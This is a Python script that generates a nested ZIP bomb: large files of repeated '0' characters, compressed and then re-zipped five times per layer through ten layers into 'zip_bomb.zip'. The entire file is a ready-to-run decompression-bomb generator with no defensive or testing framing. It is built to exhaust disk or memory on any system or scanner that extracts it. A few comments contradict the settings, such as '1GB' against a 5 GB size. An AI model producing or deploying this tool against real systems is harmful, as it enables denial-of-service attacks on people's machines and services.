import zipfile
import os

# Configuration
NUM_FILES_PER_ZIP = 5     # How many big files per ZIP
FILE_SIZE_GB = 5          # Size of each file in GB
NUM_ZIPS_PER_LAYER = 5    # How many ZIPs inside each layer
NUM_LAYERS = 10            # How deep the recursion goes

# Function to create a large dummy file (filled with zeros for high compression)
def create_large_file(filename, size_gb):
    size_bytes = size_gb * (1024**3)  # Convert GB to bytes
    with open(filename, "wb") as f:
        f.write(b"0" * size_bytes)  # Write a file full of zeros

# Step 1: Create the base ZIP with large files
base_zip = "layer0.zip"
with zipfile.ZipFile(base_zip, "w", zipfile.ZIP_DEFLATED) as zipf:
    for i in range(NUM_FILES_PER_ZIP):
        filename = f"bigfile{i}.txt"
        create_large_file(filename, FILE_SIZE_GB)  # Create 1GB file
        zipf.write(filename)  # Add to ZIP
        os.remove(filename)   # Clean up

# Step 2: Recursively nest ZIPs
previous_layer = base_zip
for layer in range(1, NUM_LAYERS + 1):
    new_zip = f"layer{layer}.zip"
    with zipfile.ZipFile(new_zip, "w", zipfile.ZIP_DEFLATED) as zipf:
        for i in range(NUM_ZIPS_PER_LAYER):
            zipf.write(previous_layer, f"nested{i}.zip")  # Add previous ZIP multiple times
    previous_layer = new_zip  # Update reference for next layer

# Final ZIP Bomb file
os.rename(previous_layer, "zip_bomb.zip")
print("ZIP bomb created as 'zip_bomb.zip'. **Use with caution!**")
